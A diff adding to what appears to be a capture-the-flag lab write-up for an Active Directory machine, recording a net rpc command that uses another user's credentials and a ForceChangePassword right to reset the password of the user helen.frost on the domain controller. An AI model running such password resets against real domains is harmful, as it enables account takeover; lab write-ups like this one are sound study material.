@@ -499,5 +499,13 @@ I have ForceChangePassword over several different users which means these users 
 ![[Pasted image 20260322175354.png]]
 This is the most interesting user, all the others have no interesting groups and no outbound object control
 
+# Compromising `helen.frost`
+```python
+net rpc password "helen.frost" 'Password123!' -U "redelegate.vl"/"marie.curie"%'Fall2024!' -S "dc.redelegate.vl"
+```
+This changed the users password
 
+```python
+
+```
 
